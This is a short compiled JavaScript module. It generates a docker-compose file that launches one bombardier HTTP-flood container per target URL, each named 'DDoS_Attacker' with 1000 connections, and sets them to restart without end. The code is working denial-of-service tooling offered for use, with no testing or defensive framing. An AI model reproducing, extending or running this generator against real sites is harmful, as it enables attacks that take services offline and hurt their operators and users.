"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.FileGenerator = void 0;
var fs_1 = __importDefault(require("fs"));
/**
 * This is used to generate and save file for attack
 */
var FileGenerator = /** @class */ (function () {
    function FileGenerator(options) {
        this.targets = [];
        this.SAVE_DIR = 'attackTargets';
        this.FILE_NAME = 'docker-compose.yml';
        this.targets = options.targets;
    }
    FileGenerator.prototype.generateAndSave = function () {
        var filepath = this.SAVE_DIR + "/" + this.FILE_NAME;
        var fileContent = "";
        fileContent += "version: \"3.9\"\n";
        fileContent += "services:\n";
        // fileContent+= "";
        // fileContent+= "";
        for (var i = 0; i < this.targets.length; i++) {
            fileContent += "\ts".concat(i, ":\n");
            fileContent += "\t\timage: alpine/bombardier\n";
            fileContent += "\t\tcontainer_name: \"DDoS_Attacker_".concat(i, "\"\n");
            fileContent += "\t\tcommand: [ \"-c\", \"1000\", \"-d\", \"60s\", \"-l\", \"".concat(this.targets[i], "\" ]\n");
            fileContent += "\t\trestart: \"always\"\n";
        }
        console.log('Saving into file: ', filepath);
        fs_1.default.writeFileSync(filepath, fileContent);
    };
    return FileGenerator;
}());
exports.FileGenerator = FileGenerator;
